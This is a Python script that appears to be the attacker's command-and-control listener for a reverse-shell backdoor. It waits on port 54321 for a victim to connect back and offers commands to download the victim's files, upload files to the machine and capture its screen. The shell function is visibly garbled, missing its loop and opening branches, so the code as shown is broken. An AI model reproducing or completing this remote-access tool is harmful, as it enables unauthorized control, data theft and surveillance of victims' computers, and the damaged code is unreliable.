#!/usr/bin/python


import socket
import json
import base64

count = 1

def reliable_send(data):
        json_data=json.dumps(data)
        target.send(json_data)





def reliable_recv():
        data=""
        while True:
                try:
                        data=data+target.recv(1024)
                        return json.loads(data)
                except ValueError:
                        continue




def shell():elif command[:8] == 'download':
                        with open(command[9:], 'wb') as file:
                                file_data = reliable_recv()
                                file.write(base64.b64decode(file_data))
                elif command[:6] == "upload":
                        try:
                                with open(command[7:], 'rb') as fin:
                                        reliable_send(base64.b64encode(fin.read()))
                        except:
                                failed='Failed to Upload'
                                reliable_send(base64.b64encode(failed))
                elif command[:10] == 'screenshot':
                        with open('screenshot%d' %count,'wb') as screen:
                                image=reliable_recv()
                                image_decoded = base64.b64decode(image)
                                if image_decoded[:4] == '[!!]':
                                        print(image_decoded)
                                else:
                                        screen.write(image_decoded)
                                        count+= 1
                else:
                        result=reliable_recv()
                        print(result)


def server():
        global ip
        global target
        global s
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        s.bind(('your ip adress',54321))
        s.listen(5)
        print("[+] Listening For Incoming connection")
        target, ip=s.accept()
        print('[+] Connection established From %s' %str(ip))

server()
shell()
s.close()


                  
